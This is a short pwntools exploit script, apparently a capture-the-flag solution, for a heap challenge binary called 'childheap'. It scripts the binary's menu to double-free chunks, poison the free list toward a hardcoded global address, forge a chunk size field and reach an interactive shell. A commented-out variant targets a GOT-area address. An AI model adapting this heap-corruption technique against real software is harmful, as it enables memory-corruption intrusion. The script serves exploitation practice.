from pwn import *

p = process('./childheap')

def r(msg):
  response = p.recvuntil(msg)

  return response

def s(msg, line=True):
  msg = msg + '\n' if True else msg

  p.send(msg)

def getmenu():
  r('>')

def alloc(size, data):
  getmenu()
  s('1')

  r('size: ')
  s(str(size))
  
  r('data: ')
  s(data)

def free():
  getmenu()
  s('2')

def modify(name, age = 0, cage = False, cname = False):
  getmenu()
  s('3')
  
  r('?')
  if cage:
    s('y')
    r('age:')
    s(str(age))
  else:
    s('n')

  r('name:')
  s(name)
  r('?')
  
  if cname:
    s('y')
  else:
    s('n')

age_addr = 0x6020c0


alloc(4095, 'AAAAAAAAAA')
free()

modify('testest')
free()

modify('Z' * 8 + p64(age_addr - 0x10))
alloc(4094, 'X' * 20)

modify('12344321' + p64(age_addr - 0x18), cname = True)
free()

modify(p64(0x00) + p64(0x31))

alloc(1024, 'AAAAAAAA')

free()

p.interactive()
# gdb.attach(p)
'''
modify('Z' * 8 + p64(0x601ff8), cname = True)

gdb.attach(p)

modify('12344321' + p64(age_addr - 0x18) + p64(age_addr - 0x18), cname = True)
free()

# gdb.attach(p)

p.interactive()
'''
